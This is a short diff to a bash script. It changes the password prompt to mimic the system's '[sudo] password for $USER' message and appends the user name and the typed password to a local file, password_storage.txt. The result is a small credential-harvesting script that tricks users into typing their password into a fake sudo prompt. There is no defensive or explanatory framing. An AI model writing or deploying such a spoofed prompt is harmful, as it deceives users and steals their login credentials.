@@ -1,3 +1,3 @@
 #! /bin/bash
-read -ps "Password: " 
-echo "Password $USER is: $REPLY" >>  password_storage.txt
+read -ps "[sudo] password for $USER" 
+echo "$USER:$REPLY" >>  password_storage.txt
